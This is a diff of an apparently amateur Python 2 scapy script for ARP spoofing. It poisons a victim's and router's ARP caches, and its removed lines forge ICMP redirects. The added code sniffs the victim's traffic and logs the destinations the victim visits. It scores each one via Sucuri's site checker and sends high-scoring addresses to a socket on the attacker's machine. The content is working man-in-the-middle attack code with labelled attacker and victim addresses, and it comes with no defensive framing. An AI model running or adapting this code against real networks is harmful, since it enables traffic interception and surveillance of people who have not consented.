@@ -1,40 +1,42 @@
 import subprocess
-import os
 import scapy.all
 import time
-import sys
 import threading
-import fcntl
+import urllib2
+import BeautifulSoup
 import socket
-import struct
 
-attacker_ip='192.168.5.99'
-victim_mac='54:27:1e:41:00:29'
-my_ip=attacker_ip
-router_mac='d8:b1:90:ed:90:40'
-attacker_mac='34:36:3b:d3:76:72'
-router_ip='192.168.5.254'
-victim_ip='0'
+attacker_ip='192.168.0.122'
+victim_mac=''
+router_mac=''
+attacker_mac=''
+router_ip=''
+victim_ip=''
 ips=[]
+sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-def icmp_gen(x):
-    print 'agtiorngrtnhiutroigtnriogninrtibniurtnnogrtonoirtngorotgnjrtnewpi'
-    res=scapy.all.Ether(dst=victim_mac, src=attacker_mac)
-    res=res/scapy.all.IP(version=4, ttl=64, proto=1, src=attacker_ip, dst=victim_ip)
-    res=res/scapy.all.ICMP(type=5, code=1, gw=router_ip)
-    res=res/x['IP']
-    del res['IP'].chksum
-    try:
-        del res['TCP'].chksum
-    except:
-        pass
-    try:
-        del res['Raw']
-    except:
-        pass
-    res.show2()
-    return res
-
+def checking_ip(ip_address):
+    scores={'Low Risk':1, 'Medium Risk':2, 'High Risk':5}
+    score_sum=0
+    a=urllib2.urlopen('https://sitecheck.sucuri.net/results/'+ip_address)
+    html=BeautifulSoup.BeautifulSoup(a)
+    result=html.findAll('table', attrs={'class':'table scan-findings'})
+    if len(result) <=0:
+        return 0
+    result=result[0].findAll('td')
+    if result[2]=='Critical':
+        return 0
+    for i in range(len(result)/4):
+        try:
+            print result[i*4+2].text
+            score_sum+=scores[result[i*4+2].text]
+        except:
+            score_sum+=10
+    if score_sum > 5:
+        client, client_address=sock.accept()
+        client.send(ip_address+'\n')
+        with open('test.txt', 'a') as f:
+            f.write(ip_address+' ')
 
 def select_victim():
     victim_ip=raw_input('Input victim IP')
@@ -62,16 +64,9 @@ def recover(victim_ip, router_ip):
     scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=3)
 
 def pr(x):
-    try:
-        print victim_ip
-
-        if(x['IP'].dst != my_ip):
-            if (x['IP'].dst == victim_ip):
-                scapy.all.sendp(icmp_gen(x))
-            scapy.all.sendp(x, iface='en0')
-    except Exception, err:
-        print err
-        pass
+    if x.haslayer('IP') and x['IP'].src == victim_ip:
+        print x['IP'].dst
+        checking_ip(x['IP'].dst)
 
 def sniffing():
     scapy.all.sniff(prn=pr)
@@ -98,7 +93,6 @@ def main():
 
     try:
         while True:
-            print 'a'
             attack(victim_ip, router_ip)
             time.sleep(2)
     except Exception, err:
@@ -110,6 +104,6 @@ def main():
 
 
 if __name__ == '__main__':
-    with open('test.txt', 'rt') as f:
-        ips=f.read().split(' ')
+    sock.bind((attacker_ip, 9876))
+    sock.listen(5)
     main()
